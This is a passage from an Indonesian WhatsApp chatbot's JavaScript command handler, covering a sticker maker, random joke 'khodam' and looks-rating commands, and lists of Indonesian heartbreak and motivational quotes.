 payreply("❌ Terjadi kesalahan saat memutar lagu.");
 }
}
break
case 's': 
            case 'sticker': 
            case 'stiker': {  
                
                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    let encmedia = await sock.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) {
                        return reply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nJika Media Yang Ingin Dijadikan Sticker Adalah Video, Batas Maksimal Durasi Video 1-9 Detik`);
                    }
                    let media = await quoted.download();
                    let encmedia = await sock.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else {
                    reply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nDurasi Video 1-9 Detik`);
                }
            }
            break
           
case 'cekkhodam': case 'cekkodam': {
if (!text) return reply('nama siapa yang mau di cek khodam nya')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"Penyepong Gupong",
"Penyepong Gupong",
"Penyepong Gupong",
"Lemari dua Pintu",
"Kacang Hijau",
"Kulkas mini",
"Burung beo",
"Air",
"Api",
"Batu",
"Magnet",
"Sempak",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"sungut lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Bjorka",
"Hacker",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak",
"Aromanis",
"Gelembung sabun",
"Kuda",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"@whiskeysockets/baileys",
"chalk",
"gradient-string",
"@adiwajshing",
"d-scrape",
"undefined",
"cannot read properties",
"performance-now",
"os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
]
    let kdm = pickRandom(khodam)
    const kodamn = `*Khodam ${text} adalah:* ${kdm}`
  reply(kodamn)
}
break

case "cekcantik": {
if (!args[0]) return reply('NAMA LU MANA??')
const ganteng = [
"60% Cantikk😍", "70% Cantik😍","80% Cantikkk bgtt😍","90% CantikkFull😍","100% Cantikk, mau ga jadi pacar aku😍"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
reply(teks)
}
break

case "cekganteng": {
if (!args[0]) return reply('NAMA LU MANA??')
const ganteng = [
"cuman 10% doang", "20% kurang ganteng soal nya", "0% karna nggak ganteng", "30% mayan gantengg", "40% ganteng", "50%Otw cari janda😎", "60% Orang Ganteng", "70%Ganteng bet","80% gantengggg parah","90% Ganteng idaman ciwi ciwi","100% Ganteng Bgt bjirr"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
reply(teks)
}
break
           
case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  reply(bacotan)
}
break
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
